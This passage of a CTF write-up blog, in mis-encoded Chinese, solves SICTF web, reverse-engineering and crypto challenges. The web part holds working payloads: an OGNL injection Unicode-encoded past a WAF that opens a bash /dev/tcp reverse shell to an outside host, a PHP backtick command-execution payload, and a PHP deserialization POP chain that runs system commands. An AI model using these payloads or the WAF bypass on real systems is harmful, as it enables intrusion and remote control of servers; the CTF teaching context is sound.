title="pain"></a>pain</h2><p>å‚è€ƒåšå®¢ï¼š<a href="https://xz.aliyun.com/t/10482#toc-7">https://xz.aliyun.com/t/10482#toc-7</a></p><ol><li><p>ç”¨<code>jd-gui</code>æŸ¥çœ‹jdkæ–‡ä»¶çš„å†…å®¹ã€‚</p></li><li><p>åœ¨<code>pain.class</code>å†…ï¼Œå¯ä»¥çŸ¥é“è¿™æ˜¯<code>Ognlçš„è§£ææ¼æ´</code>ã€‚</p><p><img src="/SICTF/w_3_1.png"></p></li><li><p>è·Ÿè¿›<code>dinner_waf.let_me_see_see</code>æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°wafã€‚</p><p><img src="/SICTF/w_3_2.png"></p></li><li><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ£€æµ‹wafå‰ï¼Œä¼šå¯¹payloadè¿›è¡Œä¸€æ¬¡urlè§£ç ã€‚å°è¯•ç”¨<code>unicodeç¼–ç </code>æ¥ç»•è¿‡ï¼Œå‘ç°å¯è¡Œã€‚</p><p><img src="/SICTF/w_3_3.png"></p></li><li><p>æœ€åç”¨è¿™ä¸¤æ¡pocä¸­çš„å…¶ä¸­ä¸€ä¸ªæ¥è¿›è¡Œåå¼¹shellã€‚</p><p><img src="/SICTF/w_3_4.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ç¼–ç å‰</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/7654du6216.zicp.fun/33699 0&gt;&amp;1&quot;&#125;)).start()</span><br><span class="line">#ç¼–ç å</span><br><span class="line">/start?payload=(new%20java.lang.%5Cu0050%5Cu0072%5Cu006f%5Cu0063%5Cu0065%5Cu0073%5Cu0073%5Cu0042%5Cu0075%5Cu0069%5Cu006c%5Cu0064%5Cu0065%5Cu0072(new%20java.lang.String%5B%5D%7B%22bash%22%2C%22-c%22%2C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F7654du6216.zicp.fun%2F33699%200%3E%261%22%7D)).start()</span><br></pre></td></tr></table></figure><p><img src="/SICTF/w_3_5.png"></p></li></ol><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><ol><li><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤äº†<code>(</code>ï¼Œ<code>.</code> ï¼Œä½†å‘ç°åå¼•å·æ²¡è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨åå¼•å·æ¥rceï¼ŒæŸ¥çœ‹æ ¹ç›®å½•çš„flagå³å¯ã€‚</p></li><li><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post: code=echo `ls /`;</span><br></pre></td></tr></table></figure></li></ol><h2 id="æˆ‘å…¨éƒ½è¦"><a href="#æˆ‘å…¨éƒ½è¦" class="headerlink" title="æˆ‘å…¨éƒ½è¦"></a>æˆ‘å…¨éƒ½è¦</h2><ol><li><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pop</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nogame</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/233333333/&quot;</span>,<span class="variable">$this</span>-&gt;pop))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è¿™æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œä¸èƒ½è®©æ–°ç”Ÿä¸€ç›´åšä¸å‡ºæ¥é­å—æ‰“å‡»&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ‰£1é€åœ°ç‹±ç«&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;i = <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;nogame-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å¿…é¡»æ‰§è¡Œ&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boy</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I also want to fall in love&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;girl != <span class="variable language_">$this</span>-&gt;boy &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;girl) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;boy))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Aec-&gt;<span class="title function_ invoke__">game</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$MyLover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æœ‰å¯¹è±¡æˆ‘ä¼šåœ¨è¿™æ‰“CTF???çœ‹æˆ‘å…‹éš†ä¸€ä¸ªå¯¹è±¡ï¼&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="string">&quot;game&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ‰“æ¸¸æˆå»ï¼Œåˆ«æƒ³ç€å¯¹è±¡äº†&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;MyLover = <span class="keyword">clone</span> <span class="keyword">new</span> B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;A_B_C&quot;</span>])&#123;</span><br><span class="line">    <span class="variable">$poc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;A_B_C&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ€è·¯ï¼š</p><ol><li>åˆ©ç”¨class B çš„ <code>__clone</code>æ¥rceã€‚</li><li>class P çš„ <code>__call</code>èƒ½å®ç°1ã€‚</li><li>class Bçš„ <code>game</code>èƒ½å®ç°2ã€‚</li><li>class Açš„<code>__toString</code>èƒ½å®ç°3ã€‚</li><li>class B çš„ <code>__destruct</code>èƒ½å®ç°4ã€‚</li><li>ç”¨æ•°ç»„ç»•è¿‡md5ã€‚</li><li>ç”¨<code>preg_match</code>è§¦å‘<code>__tostring</code>ã€‚</li></ol></li><li><p>popé“¾ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pop</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nogame</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boy</span>=<span class="keyword">array</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$MyLover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;pop=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;pop-&gt;Aec=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;pop-&gt;Aec-&gt;nogame=<span class="keyword">new</span> <span class="title function_ invoke__">p</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:3:&#123;s:3:&quot;pop&quot;;N;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;N;&#125;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;i:1;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;i:2;&#125;&#125;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/SICTF/w_5_1.png"></p></li><li><p>æŸ¥çœ‹æ ¹ç›®å½•çš„flagå³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: ?A_B_C=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;Aec&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;P&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;MyLover&quot;</span>;N;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;girl&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;i:<span class="number">1</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;boy&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;i:<span class="number">2</span>;&#125;&#125;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">post: cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—"><a href="#ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—" class="headerlink" title="ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—"></a>ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—</h2><ol><li><p>é¢˜ç›®è¦æ±‚è¦å¿«ï¼Œä¸”æ¯æ¬¡ä¸Šä¼ æ–‡ä»¶åå‘ç°æ–‡ä»¶éƒ½è¢«åˆ é™¤äº†ï¼Œæ‰€ä»¥æƒ³åˆ°äº†æ–‡ä»¶ä¸Šä¼ çš„æ¡ä»¶ç«äº‰ã€‚</p></li><li><p>ç”¨bpæ¥å¼„æ¡ä»¶ç«äº‰ï¼Œå…ˆç”¨bpçš„çˆ†ç ´æ— é™åˆ¶åœ°ä¸Šä¼ æ–‡ä»¶ï¼Œå†å¦å¼€ä¸€ä¸ªçˆ†ç ´ä¸æ–­åœ°è®¿é—®ï¼Œæœ€åå¾—åˆ°flagã€‚</p><p><img src="/SICTF/w_6_1.png"></p><p><img src="/SICTF/w_6_2.png"></p></li></ol><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h2><ol><li><p>ida32æ‰“å¼€æ–‡ä»¶ï¼Œåœ¨<code>_main_0</code>å‡½æ•°çœ‹åˆ°ä¸€ä¸²ç±»ä¼¼base64çš„å­—ç¬¦ä¸²ã€‚</p><p><img src="/SICTF/r_1_1.png"></p></li><li><p>è·Ÿè¿›<code>sub_4110F5</code>å‡½æ•°ï¼Œç›´åˆ°<code>sub_411890</code>ï¼Œå‘ç°è¿™æ®µå‡½æ•°å®ç°äº†ä¸€ä¸ªbase64çš„ç¼–ç ã€‚</p></li><li><p>æ‰¾è¡¨ã€‚</p><p><img src="/SICTF/r_1_2.png"></p></li><li><p>è§£ç åå¾—åˆ°flagã€‚</p><p><img src="/SICTF/r_1_3.png"></p></li></ol><h2 id="MyObject"><a href="#MyObject" class="headerlink" title="MyObject"></a>MyObject</h2><ol><li><p>æŸ¥çœ‹mainå‡½æ•°ï¼Œå‘ç°ä¸€ä¸ªåä¸ºrc4çš„å‡½æ•°ï¼ŒçŒœæµ‹æ˜¯rc4åŠ å¯†ï¼Œä¸”çœ‹åˆ°keyä¸º<code>SIFLAG</code>ã€‚</p><p><img src="/SICTF/r_2_1.png"></p></li><li><p>çœ‹åˆ°è¿™å‡ ä¸ªå˜é‡æœ‰å€¼ï¼ŒçŒœæµ‹è¿™æ˜¯åŠ å¯†åçš„å¯†æ–‡ã€‚</p><p><img src="/SICTF/r_2_2.png"></p></li><li><p>ç½‘ä¸Šæ‰¾ä¸€ä¸ªè§£rc4çš„è„šæœ¬æ”¹ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># RC4åŠ å¯†å’Œè§£å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KSA</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–Sç›’</span></span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># äº¤æ¢S[i]å’ŒS[j]</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRGA</span>(<span class="params">S</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># äº¤æ¢S[i]å’ŒS[j]</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="comment"># åŠ å¯†å‡½æ•°ï¼Œè¿”å›åŠ å¯†åçš„å­—èŠ‚æµ</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">        data_length = <span class="built_in">len</span>(data)</span><br><span class="line">        keystream = PRGA(KSA(key))</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data_length):</span><br><span class="line">            res.append(<span class="built_in">next</span>(keystream) ^ data[i])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line">    <span class="comment"># è§£å¯†å‡½æ•°ï¼Œè¿”å›è§£å¯†åçš„å­—èŠ‚æµ</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">        <span class="keyword">return</span> encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> encrypt, decrypt</span><br><span class="line"><span class="comment"># ç¤ºä¾‹ï¼š</span></span><br><span class="line">key = <span class="string">b&#x27;SIFLAG&#x27;</span></span><br><span class="line">encrypt_func, decrypt_func = RC4(key)</span><br><span class="line">a=[<span class="string">b&#x27;G\xCF&quot;Z\x0E\xD3\&#x27;0&#x27;</span>,<span class="string">b&#x27;\xE5\vkG&#x27;</span>,<span class="string">b&#x27;\a\x85\xC3\x99\xBAS\x8D&#x27;</span>,<span class="string">b&#x27;\x9F\x88\xFE\x10w\x1C\x01\a&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decrypted Data:&#x27;</span>, decrypted_data)</span><br><span class="line">decrypted_data=decrypt_func(a[<span class="number">0</span>][::-<span class="number">1</span>]+a[<span class="number">1</span>][::-<span class="number">1</span>]+a[<span class="number">2</span>][::-<span class="number">1</span>]+a[<span class="number">3</span>][::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decrypted Data:&#x27;</span>, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Decrypted Data: b&#x27;SICTF&#123;wow_you_get_the_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>è§£ç çš„è¿‡ç¨‹ä¸­å‘ç°ï¼Œä»ç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²å¼€å§‹ä¼šä¹±ç ï¼Œå»æ‰ç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²çš„<code>\xE5</code>ï¼Œåè¾¹å³å¯æ­£å¸¸è§£ç ã€‚</p></li></ol><h2 id="ä¸ä¸€æ ·çš„base64"><a href="#ä¸ä¸€æ ·çš„base64" class="headerlink" title="ä¸ä¸€æ ·çš„base64"></a>ä¸ä¸€æ ·çš„base64</h2><ol><li><p>ä½¿ç”¨ <a href="https://gitcode.net/mirrors/extremecoders-re/pyinstxtractor?utm_source=csdn_github_accelerator">pyinstxtractor</a>  åç¼–è¯‘exeã€‚</p></li><li><p>ç”¨ <a href="https://tool.lu/pyc">åœ¨çº¿ç½‘ç«™</a> åç¼–è¯‘<code>111.pyc</code>ã€‚</p><p><img src="/SICTF/r_3_1.png"></p></li><li><p>base64è§£ç å³å¯å¾—åˆ°flagã€‚</p><p><img src="/SICTF/r_3_2.png"></p></li></ol><h2 id="ç­¾åˆ°-PYC"><a href="#ç­¾åˆ°-PYC" class="headerlink" title="[ç­¾åˆ°]PYC"></a>[ç­¾åˆ°]PYC</h2><p>ä¸¢è¿›åœ¨çº¿pycåç¼–è¯‘å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;SICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ç­¾åˆ°-å¤å…¸å¤§æ‚çƒ©"><a href="#ç­¾åˆ°-å¤å…¸å¤§æ‚çƒ©" class="headerlink" title="[ç­¾åˆ°]å¤å…¸å¤§æ‚çƒ©"></a>[ç­¾åˆ°]å¤å…¸å¤§æ‚çƒ©</h2><ol><li><p>æ‰“å¼€æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸²emojiè¡¨æƒ…ï¼Œbase100è§£ç ã€‚</p><p><img src="/SICTF/c_1_1.png"></p></li><li><p>ä¸¢åˆ°èµ›åšå¨å­é‡Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œå¾—åˆ°flagã€‚</p><p><img src="/SICTF/c_1_2.png"></p></li></ol><h2 id="Easy-CopperSmith"><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h2><p>RSAçš„pé«˜ä½æ³„éœ²ã€‚</p><p>æºç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n = p * q</span><br><span class="line">e = 65537</span><br><span class="line">leak = p &gt;&gt; 230</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(n)</span><br><span class="line">print(leak)</span><br><span class="line">print(c)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span><br><span class="line">6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span><br><span class="line">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><ol><li><p>å…ˆåˆ©ç”¨åœ¨çº¿ç½‘ç«™ç®—å‡ºpã€‚ï¼ˆåœ¨çº¿ç½‘ç«™ï¼š<a href="https://sagecell.sagemath.org/%EF%BC%89">https://sagecell.sagemath.org/ï¼‰</a></p><p><img src="/SICTF/c_2_1.png"></p></li><li><p>æœ€åæŠŠpå¸¦å…¥å¸¸è§„çš„rsaè§£ç è„šæœ¬ï¼Œå³å¯å¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p=<span class="number">11790815224554410800121104187905468470390194289969616547114051282402254164513760262526048229096923579410713190006883604069013303904509383122210101811900773</span></span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><p>åˆ©ç”¨å·¥å…·ä¸€æŠŠæ¢­ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><img src="/SICTF/c_3_1.png"></p><h2 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h2><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/m0_63303407/article/details/127193042">https://blog.csdn.net/m0_63303407/article/details/127193042</a></p><ol><li><p>ç›´æ¥åˆ©ç”¨ç°æˆçš„è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 